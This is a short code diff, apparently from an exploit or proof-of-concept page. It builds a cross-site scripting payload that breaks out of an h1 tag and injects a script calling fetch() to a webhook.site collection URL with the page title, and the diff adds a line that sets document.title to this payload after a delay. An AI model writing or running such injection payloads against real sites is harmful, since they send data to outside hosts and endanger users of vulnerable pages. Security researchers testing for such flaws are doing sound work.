@@ -10,6 +10,7 @@
             const webhook = "https://webhook.site/78be9a55-6ff2-4723-9cf5-c6b3dd95cacc/\"";
             const payloadTitle = "</h1><script>fetch(\"" + webhook + "+ self.title)</scr" + "ipt><h1>";
             setTimeout(() => {
+                document.title = payloadTitle;
                 self.title = payloadTitle;
             }, 1000); // Change title after 1 second
         </script>
